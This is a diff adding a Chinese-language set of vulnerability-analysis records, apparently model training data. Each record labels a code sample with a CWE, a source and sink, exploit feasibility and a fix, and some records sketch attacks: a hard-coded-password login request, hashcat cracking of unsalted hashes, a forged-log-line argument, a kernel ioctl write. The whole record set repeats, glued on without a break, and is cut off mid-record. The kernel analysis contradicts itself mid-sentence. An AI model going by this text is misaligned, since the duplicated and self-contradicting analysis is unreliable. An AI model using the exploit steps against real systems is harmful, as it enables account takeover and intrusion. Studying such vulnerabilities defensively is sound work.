@@ -1,0 +1,895 @@
+##### redistill-line-1044
+分析过程:
+入口枚举：requestPasswordReset（HTTP body 的 email）与 resetPassword（HTTP body 的 token/newPassword）；非 HTTP source 为 Redis 回读的 email（第 45 行）与 stdout 日志流（第 26、52 行）。
+第 9 行 const { email } = req.body; → 第 12-14 行 emailRegex.test(email) 做格式校验：仅约束形态，非安全边界，但不参与任何危险 sink。
+第 18-19 行 crypto.randomBytes(32).toString('hex') + createHash('sha256')：令牌 256 位 CSPRNG 熵，Redis 仅存 tokenHash——令牌生成与存储侧防御有效。
+第 22 行 await redis.set(pwd_reset:{tokenHash}, email, 'EX', TOKEN_TTL)：带 TTL 过期；第 43-45 行以哈希后令牌查库、第 47-49 行未命中即拒绝、第 55 行 redis.del 一次性作废——令牌生命周期防御链完整，无枚举面（第 28 行统一返回 "sent if email exists"）。
+第 51 行 const passwordHash = crypto.createHash('sha256').update(newPassword).digest('hex');：核验结论——无效防御。SHA-256 是通用快速哈希且无盐：一旦用户库泄露，攻击者可 GPU 级速率离线爆破全部口令，且同口令同哈希可跨用户撞库比对。
+第 52 行 console.log([DB] UPDATE ... password_hash='{passwordHash}' ...)：口令哈希进日志流；第 26 行 console.log([EMAIL] To: {email}, Link: {resetLink}) 把明文重置令牌写入日志——能读取进程日志者可在 TTL 窗口内直接接管对应账户。
+利用可行性：a) 拿到 DB 快照 → 无盐 SHA-256 离线爆破（hashcat 直跑）；b) 拿到 stdout/日志采集 → 提取 token= 直接调用重置接口完成账户接管。
+互斥锚句：非 CWE-89，因为第 52 行的 SQL 文本仅出现在 console.log 字符串中，不存在数据库执行 sink，email 又源自 Redis 回读而非当次请求；非 CWE-321/798，因为无硬编码密钥或凭证字面量。
+has_vulnerability: true
+vulnerability_type: CWE-916 Use of Password Hash With Insufficient Computational Effort
+risk_level: High
+source: line 33: const { token, newPassword } = req.body;（HTTP 请求体）
+sink: line 51: crypto.createHash('sha256').update(newPassword).digest('hex') 无盐快速哈希后作为口令存储；line 26 明文令牌写入日志
+explanation: 口令以无盐单次 SHA-256 存储且重置令牌被打印进日志，构成可离线爆破与可经日志接管的凭证保护缺陷；非 CWE-89 因为第 52 行 SQL 仅为日志字符串、无查询执行 sink。
+fix_suggestion: 第 51 行改用 bcrypt/scrypt/argon2 等加盐慢哈希（如 crypto.scryptSync(newPassword, perUserSalt, 64) 并落库存盐）；第 26、52 行移除令牌与哈希的日志输出，邮件改经真实邮件通道投递；令牌侧现有 TTL+一次性删除机制保留即可。
+
+redistill-line-110
+分析过程:
+入口枚举：非 HTTP source 为外部原始字节流 buffer/len（get_frame_sample 第 67 行入参，解析不可信音频容器）与 frame_idx/ch 两个调用方参数；无 HTTP/配置/环境变量入口。
+防御逐段核验（parse_audio_container）：第 41 行 buffer_len < CHUNK_HEADER_SIZE 拒绝短输入；第 46-48 行用 memcpy 分字段解析，无越界读；第 50 行 channels == 0 || channels > MAX_CHANNELS、第 51 行 bits % 8 != 0 || bits > 32 校验头部字段；第 57-58 行 data = buffer + 8、data_size = buffer_len - 8——data_size 由实际缓冲长度推导而非采信头部声明值，从根上消除"头部谎报大尺寸"攻击面。
+防御逐段核验（decode_frame_sample）：第 20-21 行复核 channels 范围与 channel < channels；第 23-24 行 bytes_per_sample 限 1..4；第 30 行 offset + bytes_per_sample > chunk->data_size 为完整上界检查，其中第 27、30 行均以 uint64_t 做乘法与加法——32 位 frame_index × frame_size 在 64 位宽内不可能回绕，边界检查无法被整数溢出致盲。
+第 33-34 行 memcpy(&sample, chunk->data + offset, bytes_per_sample)：sample 为 int32_t（4 字节），bytes_per_sample ≤ 4，拷贝长度受目标容量约束，且 offset 已过第 30 行上界检查——无越界读写。
+第 62 行注释的 32 位截断（static_cast<uint32_t>(buffer_len - 8)）：仅当 buffer_len ≥ 4GiB 时发生，截断使 data_size 变小，检查方向是"更保守"，最坏造成合法大帧被误拒（可用性问题），不产生越界；实际音频缓冲达 4GiB 属样本外假设。
+残余点（非漏洞）：第 46-48 行 memcpy 依赖宿主端序，跨端序文件会解错数值，属正确性/可移植性问题，无内存安全影响。
+互斥锚句：非 CWE-190，因为所有参与边界判定的乘法/加法均在 uint64_t 域完成、无法回绕绕过第 30 行检查；非 CWE-125/787，因为唯一的内存访问点第 34 行被完整上界检查前置覆盖。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 头部字段全部经范围校验、data_size 由真实缓冲长度推导、偏移运算在 64 位域完成后经完整上界检查才允许 memcpy，防御链闭合；非 CWE-190 因为边界算术无回绕可能，32 位截断方向保守不构成越界。
+fix_suggestion: no fix needed。可选加固：第 62 行对 buffer_len - 8 > UINT32_MAX 显式返回 -1，消除大缓冲下的静默截断歧义；解析处按小端显式装配字段以摆脱宿主端序依赖。
+
+redistill-line-1126
+分析过程:
+入口枚举：HTTP 语义入口为 login 的 username/password 参数与任意请求的 Authorization 头（第 44 行）；无配置/文件/DB source。
+防御逐段核验（会话令牌路径）：第 31 行 UUID.randomUUID() 为 122 位 CSPRNG 熵，不可爆破；第 46 行 replace("Bearer ", "") 只是前缀清理非安全防御；第 49-53 行 sessionStore.get(token) 未命中即返回 null——第 39/47/51 行注释宣称"直接信任未校验"，但代码事实是令牌必须存在于服务端存储才映射出用户，伪造/猜测令牌路径（第 75-77 行自测亦输出 anonymous）不成立；注释属防御迷惑，判定以可执行事实为准。
+第 28 行 if (user != null && "correct_password".equals(password))：核验结论——致命缺陷。口令校验不比对用户凭证，而是与硬编码字面量 "correct_password" 比较：任何攻击者只要知道该常量（源码可见/可逆向），配合可枚举的用户名（第 62 行 alice、第 63 行 bob）即可登录任意账户，包括 admin 角色（第 58-60 行 getUserRole 直接放行角色）。
+利用可行性：最小路径 = POST username=alice&password=correct_password → 第 32 行签发合法会话 → 第 57-60 行取得 admin 角色。无需窃取令牌。
+次级缺陷（并入证据链）：第 9 行 static Map sessionStore 全局共享且 HashMap 非线程安全；令牌无过期/注销机制，泄露即永久有效（第 79-82 行演示）。
+互斥锚句：非 CWE-347，因为令牌签名/查找校验本身存在且有效，缺陷不在验证被禁用；非 CWE-639/862，因为对象级授权查找链完整，问题出在认证门本身被硬编码口令短路——归 798（硬编码凭证字面量用于认证），259 为其近邻语义（全局固定口令）。
+has_vulnerability: true
+vulnerability_type: CWE-798 Use of Hard-coded Credentials
+risk_level: Critical
+source: line 27: login(Request req, String username, String password) 中攻击者提交的 password（HTTP 入口）
+sink: line 28: "correct_password".equals(password) 与硬编码字面量比对完成认证判定
+explanation: 所有用户的认证均通过与硬编码口令字面量相等来放行，攻击者凭源码可见常量即可登录任意账户含 admin；非 CWE-347 因为会话令牌查找校验真实存在，被短路的是认证门而非签名验证。
+fix_suggestion: 第 28 行改为按用户存储的加盐慢哈希比对（如 user.passwordHash + bcrypt/argon2 校验），删除全局字面量口令；第 31-33 行为令牌加过期与吊销；第 9 行换用线程安全存储并做会话隔离。
+
+redistill-line-113
+分析过程:
+入口枚举：非 HTTP source 为 merge_buffers 的三个调用方参数 dst/src1/src2（库 API 边界，len 与 data 均来自外部调用者，第 22 行）。
+第 24-26 行 if (!dst || !src1 || !src2)：仅判空，未约束 dst->len 与将写入长度的关系。
+第 27-29 行 int total = src1->len + src2->len; if (total > MAX_BUF) return -1;：核验结论——防御作用位置错误。它把总长钉死在 128 以内，但比较对象是常量 MAX_BUF，而非 dst->len：函数隐含假设"dst 至少有 MAX_BUF 容量"，该假设未在 API 内强制。
+第 13-15 行 copy_at_offset 的检查 offset < 0 || offset > dst->len：核验结论——不完整防御。只校验起始偏移不越过 dst->len，缺少 offset + src_len <= dst->len 的剩余空间检查（第 16 行注释亦自证），第 18 行 memcpy(dst->data + offset, src, src_len) 据此可写穿目标。
+逐跳利用链：攻击者/上层传入 dst->len < total ≤ 128 的目标（如第 54 行以 64 字节堆缓冲作 dst）→ 第 28 行检查通过 → 第 37 行 copy_at_offset(dst, tmp, 0, total) → 第 14 行 0 > 64 为假放行 → 第 18 行 memcpy 向 64 字节堆块写 128 字节 → 堆越界写（CWE-787 后果形态），可覆盖相邻堆元数据/对象。
+main 中第 53 行 malloc(MAX_BUF) 使示例路径恰好不触发，属巧合性安全；漏洞在库函数契约层，任何 dst->len < total 的调用即触发。
+互斥锚句：非 CWE-190，因为第 28 行已把 total 限 ≤128，int 加法无回绕参与；非 CWE-122 独立成因，因为根因是"拷贝长度未对照目标剩余空间校验"（120 经典形态），堆区只是落地位置。
+has_vulnerability: true
+vulnerability_type: CWE-120 Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
+risk_level: High
+source: line 22: int merge_buffers(Buffer *dst, const Buffer *src1, const Buffer *src2) 中调用方控制的 dst->len 与 src1/src2->len
+sink: line 18: memcpy(dst->data + offset, src, src_len) 在剩余空间未校验时写穿目标缓冲
+explanation: 总长检查只对常量 MAX_BUF 生效而 copy_at_offset 仅校验起始偏移不校验 offset+src_len 上界，任何 dst->len 小于合并长度的调用都导致堆越界写；非 CWE-190 因为长度已被第 28 行钳制在 128 内、无整数回绕参与。
+fix_suggestion: 第 14 行补全为 if (offset < 0 || src_len < 0 || offset > dst->len || src_len > dst->len - offset) return -1;；第 28 行将 total > MAX_BUF 改为/追加 total > dst->len，使检查对照真实目标容量而非隐含常量假设。
+
+redistill-line-116
+分析过程:
+入口枚举：非 HTTP source 为构造参数 path（第 10 行）与文件系统状态（/tmp/backup.dat 的存在性/大小/内容，第 36-54 行）；无网络入口。
+防御逐段核验：第 37-40 行 open 失败与 fstat 失败/空文件路径均提前 return；第 44 行 malloc(m_size + 1) 失败时第 45-47 行 close(fd) 后 return——此路径不触碰旧 m_data（旧数据保留或仍为 nullptr）；第 51-56 行读短失败时 free 后同步置 m_data = nullptr; m_size = 0;。
+逐状态追踪 free 安全性：reload（第 22-29 行）仅在 m_data 非空时 free 且立即置 nullptr——第二次调用若第一次加载失败，if (m_data) 为假直接跳过，不发生 double free；第 63/64 行注释宣称"第二次 reload 触发 double free"，与代码事实不符，注释属防御迷惑，判定以可执行语义为准。析构（第 14-19 行）同样先判空再 free 并置空。
+第 57 行 m_data[m_size] = '0'：分配为 m_size + 1，写终止符在界内；第 51 行 read 返回值与 m_size 全量比对，部分读即整体失败重置——无越界读写、无未初始化使用。
+残余点（非内存安全漏洞）：a) 第 36 行 open(m_path) 到第 51 行 read 之间对 /tmp 世界可写路径存在 TOCTOU/symlink 竞态（CWE-367 形态），但目标路径硬编码为普通文件读取、需本地攻击者抢先布链，影响限于读错文件内容；b) main 第 66 行未检查第二次 reload 返回值即继续，若文件被删则 data() 为空指针交由第 65-67 行流程处理（size() 返回 0，安全）。
+互斥锚句：非 CWE-415，因为所有 free 点（第 24、53、16 行）均受"非空判断+置空"配对保护，任意执行序列下同一指针不会被 free 两次；非 CWE-416，因为 free 后指针即置 nullptr，无悬垂引用被后续解引用。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 每处 free 均与判空和置 nullptr 配对，reload 失败路径完整重置状态，注释宣称的 double free 在代码事实中不可达；非 CWE-415 因为不存在同一非空指针被二次释放的执行序列。
+fix_suggestion: no fix needed。可选加固：第 36 行改用 open(path, O_RDONLY | O_NOFOLLOW) 消除 /tmp 符号链接竞态；main 第 66 行检查 reload() 返回值后再使用数据。
+
+redistill-line-153
+分析过程:
+入口枚举：非 HTTP source 为 ioctl 系统调用参数 arg 指向的用户态内存（第 35 行 copy_from_user），rio.buf_len 与 rio.buf 内容完全由用户态攻击者控制；设备节点可被本地非特权进程打开即达。
+第 35-38 行 copy_from_user(&rio, ..., sizeof(rio))：整结构拷入内核栈 rio，本身有界，无缺陷。
+防御逐段核验：第 40-43 行 if (rio.buf_len > MAX_REG_BUF) ret = -EINVAL;——核验结论——不完整防御。buf_len 为 unsigned int（第 13 行），仅做 > 128 上界检查，漏掉 buf_len == 0 之外的语义没问题，但关键缺口是：该检查放行了 buf_len ≤ 128？否——真正缺口在检查与消费点之间无契约传递：drv_prepare_data（第 19-25 行）内部直接以 rio->buf_len 为循环上界写 dst[i]，而 dst 是调用方栈上 char stack_buf[MAX_REG_BUF]（第 30 行）。一旦任何其他调用路径（或未来重构）未经第 40 行检查即调用，或 buf_len 在检查后被并发改写（此处 rio 已在内核栈、mutex 持锁，改写不成立），循环即越界。就当前唯一路径逐字核验：第 40 行确实拦截 buf_len > 128，循环写 dst[0..buf_len-1] 最大 128 字节 = stack_buf 容量，写本身不越界。
+但第 44 行 copy_to_user((void __user *)rio.buf, stack_buf, rio.buf_len)：核验结论——致命缺陷。rio.buf 是随 copy_from_user 一并拷入的用户态地址值（第 14 行结构内嵌 char buf[128] 被当作指针语义使用）：内核把用户可控的 128 字节数组首元素reinterpret为 void __user * 目标地址，等于允许攻击者指定任意用户地址作为写回目的地；更严重的是该"地址"实为内核栈上 rio.buf 数组的内容字节，攻击者可将 buf 前 8 字节填成任意值 → copy_to_user 向任意用户地址写 buf_len 字节内核栈数据（信息泄露），且绕过了"结果应写回 arg 结构"的设计意图。同时第 41 行注释自证的"内部未复核"使 drv_prepare_data 成为纵深缺失点：防御只在调用侧单点存在（第 40 行），函数自身对 dst 容量零感知（第 22 行循环无界约束），属 CWE-787 的结构性温床。
+利用可行性：本地攻击者 open 设备 → ioctl(DRV_IOCTL_READ_REG) 传 buf_len ≤ 128、buf 前 8 字节 = 目标用户地址 → 内核将 stack_buf 内容（含 XOR 变换后的用户数据与相邻栈字节）写至指定地址/泄露栈布局；若维护者按注释移除或绕过第 40 行检查（该检查与 sink 跨函数分离，重构极易丢失），buf_len = 0xFFFFFFFF 即直接内核栈溢出 → 本地提权。
+互斥锚句：非 CWE-190，因为 buf_len 的 > MAX_REG_BUF 比较在无符号域直接成立、无回绕参与；非 CWE-200 单独成因，因为核心缺陷是用户可控地址/长度进入内核写路径且跨函数边界检查未内聚（787 族结构），泄露只是其后果之一。
+has_vulnerability: true
+vulnerability_type: CWE-787 Out-of-bounds Write
+risk_level: Critical
+source: line 35: copy_from_user(&rio, (void __user *)arg, sizeof(rio)) 引入用户控制的 rio.buf_len 与 rio.buf
+sink: line 22: dst[i] = (char)(rio->buf[i] ^ 0xA5); 循环上界完全依赖调用侧单点检查；line 44: copy_to_user((void __user *)rio.buf, stack_buf, rio.buf_len) 以用户可控地址值作写回目标
+explanation: buf_len 的边界防御只存在于 ioctl 分发层单点且未随参数契约传入 drv_prepare_data，写回阶段又把结构内嵌数组当作用户指针使用，构成内核栈越界写与任意地址写回的提权路径；非 CWE-190 因为无符号比较无回绕，缺陷是校验不内聚与指针语义误用。
+fix_suggestion: 第 19-25 行为 drv_prepare_data 增加 dst_len 参数并在循环前复核 rio->buf_len <= dst_len（纵深防御内聚到消费点）；第 44 行改为 copy_to_user((void __user *)arg + offsetof(struct reg_io, buf), stack_buf, rio.buf_len)，禁止把结构内容当指针；第 40 行检查保留并对 buf_len == 0 显式短路。
+
+redistill-line-1542
+分析过程:
+入口枚举：非 HTTP source 为命令行参数 argv[1]（第 52 行）经 write_log(argv[1], LOG_INFO)（第 54 行）流入日志内容；日志路径为硬编码常量（第 9 行），无外部可控文件入口。
+防御逐段核验：第 37 行 snprintf(log_entry, sizeof(log_entry), "[%s] %sn", level_str, msg)——对缓冲溢出有效：写入被钳制在 128 字节内，超长 msg 截断而非越界，CWE-120 路径闭合。第 22-34 行 switch(level) 全部映射到固定字面量，level_str 无注入面。第 39-45 行 fopen(log_path, "a") 追加模式 + 失败即 return，无覆写/命令执行 sink。
+缺陷核验：msg（含 argv[1]）未做任何输出中和——换行、ANSI 转义、终端控制序列原样进入第 45 行 fputs(log_entry, fp) 落盘。攻击者执行 ./app $'fake entryn[ERROR] admin logged in' 即可在日志中伪造整行记录（CWE-117 日志注入），污染审计链、误导后续人工/自动日志分析；若日志被终端工具 cat/tail 查看，未净化的 OSC/ANSI 序列另触及 CWE-150 近邻面。
+利用可行性：本地即可复现（argv 直接可控），影响限于日志完整性与查看端呈现，不产生代码执行、不越权、不泄露既有秘密——影响面有限。
+次级核验：第 9 行硬编码 /var/log/app/default.log 无用户输入参与，非 CWE-22/73；main 的 argc 分支（第 51-57 行）保证空参走固定文案，无空指针解引用。
+互斥锚句：非 CWE-78/77，因为 msg 只进入 snprintf/fputs 数据流，不存在系统命令或解释器 sink；非 CWE-120，因为第 37 行 snprintf 已完备钳制长度；非 CWE-22/73，因为路径不可外部控制。
+has_vulnerability: true
+vulnerability_type: CWE-117 Improper Output Neutralization for Logs
+risk_level: Low
+source: line 52: if (argc > 1) 分支下的 argv[1]（命令行参数，外部可控）
+sink: line 45: fputs(log_entry, fp) 未中和的换行/控制字符原样写入日志文件
+explanation: 命令行输入经 snprintf 截断后未做换行与控制字符中和即落盘日志，可伪造日志行污染审计记录；非 CWE-120 因为第 37 行 snprintf 已完备限制写入长度，溢出路径不存在。
+fix_suggestion: 第 37 行之前对 msg 做输出中和：将 r/n 转义为字面 r/n、剥离或转义 ESC(0x1B) 控制序列（可写 sanitize_for_log() 辅助函数）；第 9 行日志路径改由配置指定并校验目录属主，降低符号链接改写风险。
+
+redistill-line-1587
+分析过程:
+入口枚举：非 HTTP source 为配置文件 /etc/myapp/config.json（第 4 行常量路径，第 15/45 行 json.load 读入）与文件系统 mtime 信号（第 35 行 os.path.getmtime）；无网络入口。
+数据流核验：第 15 行 self._config = json.load(f) 仅解析纯数据 JSON——非反序列化器（无 pickle/eval），CWE-502 不成立；第 47-48 行 get() 只做字典读取，配置值未进入任何命令/SQL/路径 sink（第 65-66 行仅打印 db_host），无注入面。
+注释宣称缺陷核验（第 69 行"错误：在close之后再调用reload"）：close()（第 50-55 行）的实际语义仅是 self._watcher = None + 打印，不释放任何文件句柄、不停止线程——with open 在第 45-46 行已即时关闭句柄，故第 70 行 loader.reload() 是对已关闭"资源"的普通重读，无 use-after-free/UAF 等价形态（Python 层无悬垂内存），注释属防御迷惑，判定以代码事实为准。
+真实并发形态核验：第 23-27 行 threading.Thread(target=self._watch_loop); t.daemon = True; t.start() 后线程不可停止（_watch_loop 第 30-41 行 while True 无退出事件），close() 置 None 只是丢弃引用——主线程第 70 行 reload() 与监控线程第 38 行 self.reload() 可并发执行。逐段评估后果：self._config = json.load(f) 是单次名字重绑定，CPython 下引用赋值原子，读侧 get() 要么见旧字典要么见新字典，无撕裂状态；两线程各自的 with open 独立句柄，无共享 fd 竞争。最坏后果为重复解析浪费、或文件被并发删除时 reload()（第 45-46 行无 try 包裹）抛 FileNotFoundError/JSONDecodeError 使调用方或监控线程异常终止——可用性/健壮性问题。
+互斥锚句：非 CWE-362 漏洞级成因，因为竞态双方对共享状态的操作是原子重绑定、无损坏窗口可利用；非 CWE-672，因为 close 未真正释放资源，"释放后使用"前提不存在；非 CWE-502，因为 json.load 是纯数据解析。
+利用可行性：无攻击者动作可将其转化为机密性/完整性影响——缺少可控输入到危险 sink 的通路，仅有自我 DoS 形态的异常传播。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: close 仅置空引用未释放资源，reload 重读为原子字典重绑定，监控线程竞态无损坏窗口且 JSON 解析为纯数据流，注释宣称的"关闭后使用"在代码事实中不构成安全缺陷；非 CWE-362 因为共享状态更新原子、无可利用交错。
+fix_suggestion: no fix needed。可选加固：引入 threading.Event 停止标志使 close() 真正终止 _watch_loop 并 join()；第 45-46 行 reload() 增加 try/except 与内容校验（schema 白名单），防止畸形配置导致线程崩溃或脏配置生效。##### redistill-line-1044
+分析过程:
+入口枚举：requestPasswordReset（HTTP body 的 email）与 resetPassword（HTTP body 的 token/newPassword）；非 HTTP source 为 Redis 回读的 email（第 45 行）与 stdout 日志流（第 26、52 行）。
+第 9 行 const { email } = req.body; → 第 12-14 行 emailRegex.test(email) 做格式校验：仅约束形态，非安全边界，但不参与任何危险 sink。
+第 18-19 行 crypto.randomBytes(32).toString('hex') + createHash('sha256')：令牌 256 位 CSPRNG 熵，Redis 仅存 tokenHash——令牌生成与存储侧防御有效。
+第 22 行 await redis.set(pwd_reset:{tokenHash}, email, 'EX', TOKEN_TTL)：带 TTL 过期；第 43-45 行以哈希后令牌查库、第 47-49 行未命中即拒绝、第 55 行 redis.del 一次性作废——令牌生命周期防御链完整，无枚举面（第 28 行统一返回 "sent if email exists"）。
+第 51 行 const passwordHash = crypto.createHash('sha256').update(newPassword).digest('hex');：核验结论——无效防御。SHA-256 是通用快速哈希且无盐：一旦用户库泄露，攻击者可 GPU 级速率离线爆破全部口令，且同口令同哈希可跨用户撞库比对。
+第 52 行 console.log([DB] UPDATE ... password_hash='{passwordHash}' ...)：口令哈希进日志流；第 26 行 console.log([EMAIL] To: {email}, Link: {resetLink}) 把明文重置令牌写入日志——能读取进程日志者可在 TTL 窗口内直接接管对应账户。
+利用可行性：a) 拿到 DB 快照 → 无盐 SHA-256 离线爆破（hashcat 直跑）；b) 拿到 stdout/日志采集 → 提取 token= 直接调用重置接口完成账户接管。
+互斥锚句：非 CWE-89，因为第 52 行的 SQL 文本仅出现在 console.log 字符串中，不存在数据库执行 sink，email 又源自 Redis 回读而非当次请求；非 CWE-321/798，因为无硬编码密钥或凭证字面量。
+has_vulnerability: true
+vulnerability_type: CWE-916 Use of Password Hash With Insufficient Computational Effort
+risk_level: High
+source: line 33: const { token, newPassword } = req.body;（HTTP 请求体）
+sink: line 51: crypto.createHash('sha256').update(newPassword).digest('hex') 无盐快速哈希后作为口令存储；line 26 明文令牌写入日志
+explanation: 口令以无盐单次 SHA-256 存储且重置令牌被打印进日志，构成可离线爆破与可经日志接管的凭证保护缺陷；非 CWE-89 因为第 52 行 SQL 仅为日志字符串、无查询执行 sink。
+fix_suggestion: 第 51 行改用 bcrypt/scrypt/argon2 等加盐慢哈希（如 crypto.scryptSync(newPassword, perUserSalt, 64) 并落库存盐）；第 26、52 行移除令牌与哈希的日志输出，邮件改经真实邮件通道投递；令牌侧现有 TTL+一次性删除机制保留即可。
+
+redistill-line-110
+分析过程:
+入口枚举：非 HTTP source 为外部原始字节流 buffer/len（get_frame_sample 第 67 行入参，解析不可信音频容器）与 frame_idx/ch 两个调用方参数；无 HTTP/配置/环境变量入口。
+防御逐段核验（parse_audio_container）：第 41 行 buffer_len < CHUNK_HEADER_SIZE 拒绝短输入；第 46-48 行用 memcpy 分字段解析，无越界读；第 50 行 channels == 0 || channels > MAX_CHANNELS、第 51 行 bits % 8 != 0 || bits > 32 校验头部字段；第 57-58 行 data = buffer + 8、data_size = buffer_len - 8——data_size 由实际缓冲长度推导而非采信头部声明值，从根上消除"头部谎报大尺寸"攻击面。
+防御逐段核验（decode_frame_sample）：第 20-21 行复核 channels 范围与 channel < channels；第 23-24 行 bytes_per_sample 限 1..4；第 30 行 offset + bytes_per_sample > chunk->data_size 为完整上界检查，其中第 27、30 行均以 uint64_t 做乘法与加法——32 位 frame_index × frame_size 在 64 位宽内不可能回绕，边界检查无法被整数溢出致盲。
+第 33-34 行 memcpy(&sample, chunk->data + offset, bytes_per_sample)：sample 为 int32_t（4 字节），bytes_per_sample ≤ 4，拷贝长度受目标容量约束，且 offset 已过第 30 行上界检查——无越界读写。
+第 62 行注释的 32 位截断（static_cast<uint32_t>(buffer_len - 8)）：仅当 buffer_len ≥ 4GiB 时发生，截断使 data_size 变小，检查方向是"更保守"，最坏造成合法大帧被误拒（可用性问题），不产生越界；实际音频缓冲达 4GiB 属样本外假设。
+残余点（非漏洞）：第 46-48 行 memcpy 依赖宿主端序，跨端序文件会解错数值，属正确性/可移植性问题，无内存安全影响。
+互斥锚句：非 CWE-190，因为所有参与边界判定的乘法/加法均在 uint64_t 域完成、无法回绕绕过第 30 行检查；非 CWE-125/787，因为唯一的内存访问点第 34 行被完整上界检查前置覆盖。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 头部字段全部经范围校验、data_size 由真实缓冲长度推导、偏移运算在 64 位域完成后经完整上界检查才允许 memcpy，防御链闭合；非 CWE-190 因为边界算术无回绕可能，32 位截断方向保守不构成越界。
+fix_suggestion: no fix needed。可选加固：第 62 行对 buffer_len - 8 > UINT32_MAX 显式返回 -1，消除大缓冲下的静默截断歧义；解析处按小端显式装配字段以摆脱宿主端序依赖。
+
+redistill-line-1126
+分析过程:
+入口枚举：HTTP 语义入口为 login 的 username/password 参数与任意请求的 Authorization 头（第 44 行）；无配置/文件/DB source。
+防御逐段核验（会话令牌路径）：第 31 行 UUID.randomUUID() 为 122 位 CSPRNG 熵，不可爆破；第 46 行 replace("Bearer ", "") 只是前缀清理非安全防御；第 49-53 行 sessionStore.get(token) 未命中即返回 null——第 39/47/51 行注释宣称"直接信任未校验"，但代码事实是令牌必须存在于服务端存储才映射出用户，伪造/猜测令牌路径（第 75-77 行自测亦输出 anonymous）不成立；注释属防御迷惑，判定以可执行事实为准。
+第 28 行 if (user != null && "correct_password".equals(password))：核验结论——致命缺陷。口令校验不比对用户凭证，而是与硬编码字面量 "correct_password" 比较：任何攻击者只要知道该常量（源码可见/可逆向），配合可枚举的用户名（第 62 行 alice、第 63 行 bob）即可登录任意账户，包括 admin 角色（第 58-60 行 getUserRole 直接放行角色）。
+利用可行性：最小路径 = POST username=alice&password=correct_password → 第 32 行签发合法会话 → 第 57-60 行取得 admin 角色。无需窃取令牌。
+次级缺陷（并入证据链）：第 9 行 static Map sessionStore 全局共享且 HashMap 非线程安全；令牌无过期/注销机制，泄露即永久有效（第 79-82 行演示）。
+互斥锚句：非 CWE-347，因为令牌签名/查找校验本身存在且有效，缺陷不在验证被禁用；非 CWE-639/862，因为对象级授权查找链完整，问题出在认证门本身被硬编码口令短路——归 798（硬编码凭证字面量用于认证），259 为其近邻语义（全局固定口令）。
+has_vulnerability: true
+vulnerability_type: CWE-798 Use of Hard-coded Credentials
+risk_level: Critical
+source: line 27: login(Request req, String username, String password) 中攻击者提交的 password（HTTP 入口）
+sink: line 28: "correct_password".equals(password) 与硬编码字面量比对完成认证判定
+explanation: 所有用户的认证均通过与硬编码口令字面量相等来放行，攻击者凭源码可见常量即可登录任意账户含 admin；非 CWE-347 因为会话令牌查找校验真实存在，被短路的是认证门而非签名验证。
+fix_suggestion: 第 28 行改为按用户存储的加盐慢哈希比对（如 user.passwordHash + bcrypt/argon2 校验），删除全局字面量口令；第 31-33 行为令牌加过期与吊销；第 9 行换用线程安全存储并做会话隔离。
+
+redistill-line-113
+分析过程:
+入口枚举：非 HTTP source 为 merge_buffers 的三个调用方参数 dst/src1/src2（库 API 边界，len 与 data 均来自外部调用者，第 22 行）。
+第 24-26 行 if (!dst || !src1 || !src2)：仅判空，未约束 dst->len 与将写入长度的关系。
+第 27-29 行 int total = src1->len + src2->len; if (total > MAX_BUF) return -1;：核验结论——防御作用位置错误。它把总长钉死在 128 以内，但比较对象是常量 MAX_BUF，而非 dst->len：函数隐含假设"dst 至少有 MAX_BUF 容量"，该假设未在 API 内强制。
+第 13-15 行 copy_at_offset 的检查 offset < 0 || offset > dst->len：核验结论——不完整防御。只校验起始偏移不越过 dst->len，缺少 offset + src_len <= dst->len 的剩余空间检查（第 16 行注释亦自证），第 18 行 memcpy(dst->data + offset, src, src_len) 据此可写穿目标。
+逐跳利用链：攻击者/上层传入 dst->len < total ≤ 128 的目标（如第 54 行以 64 字节堆缓冲作 dst）→ 第 28 行检查通过 → 第 37 行 copy_at_offset(dst, tmp, 0, total) → 第 14 行 0 > 64 为假放行 → 第 18 行 memcpy 向 64 字节堆块写 128 字节 → 堆越界写（CWE-787 后果形态），可覆盖相邻堆元数据/对象。
+main 中第 53 行 malloc(MAX_BUF) 使示例路径恰好不触发，属巧合性安全；漏洞在库函数契约层，任何 dst->len < total 的调用即触发。
+互斥锚句：非 CWE-190，因为第 28 行已把 total 限 ≤128，int 加法无回绕参与；非 CWE-122 独立成因，因为根因是"拷贝长度未对照目标剩余空间校验"（120 经典形态），堆区只是落地位置。
+has_vulnerability: true
+vulnerability_type: CWE-120 Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
+risk_level: High
+source: line 22: int merge_buffers(Buffer *dst, const Buffer *src1, const Buffer *src2) 中调用方控制的 dst->len 与 src1/src2->len
+sink: line 18: memcpy(dst->data + offset, src, src_len) 在剩余空间未校验时写穿目标缓冲
+explanation: 总长检查只对常量 MAX_BUF 生效而 copy_at_offset 仅校验起始偏移不校验 offset+src_len 上界，任何 dst->len 小于合并长度的调用都导致堆越界写；非 CWE-190 因为长度已被第 28 行钳制在 128 内、无整数回绕参与。
+fix_suggestion: 第 14 行补全为 if (offset < 0 || src_len < 0 || offset > dst->len || src_len > dst->len - offset) return -1;；第 28 行将 total > MAX_BUF 改为/追加 total > dst->len，使检查对照真实目标容量而非隐含常量假设。
+
+redistill-line-116
+分析过程:
+入口枚举：非 HTTP source 为构造参数 path（第 10 行）与文件系统状态（/tmp/backup.dat 的存在性/大小/内容，第 36-54 行）；无网络入口。
+防御逐段核验：第 37-40 行 open 失败与 fstat 失败/空文件路径均提前 return；第 44 行 malloc(m_size + 1) 失败时第 45-47 行 close(fd) 后 return——此路径不触碰旧 m_data（旧数据保留或仍为 nullptr）；第 51-56 行读短失败时 free 后同步置 m_data = nullptr; m_size = 0;。
+逐状态追踪 free 安全性：reload（第 22-29 行）仅在 m_data 非空时 free 且立即置 nullptr——第二次调用若第一次加载失败，if (m_data) 为假直接跳过，不发生 double free；第 63/64 行注释宣称"第二次 reload 触发 double free"，与代码事实不符，注释属防御迷惑，判定以可执行语义为准。析构（第 14-19 行）同样先判空再 free 并置空。
+第 57 行 m_data[m_size] = '0'：分配为 m_size + 1，写终止符在界内；第 51 行 read 返回值与 m_size 全量比对，部分读即整体失败重置——无越界读写、无未初始化使用。
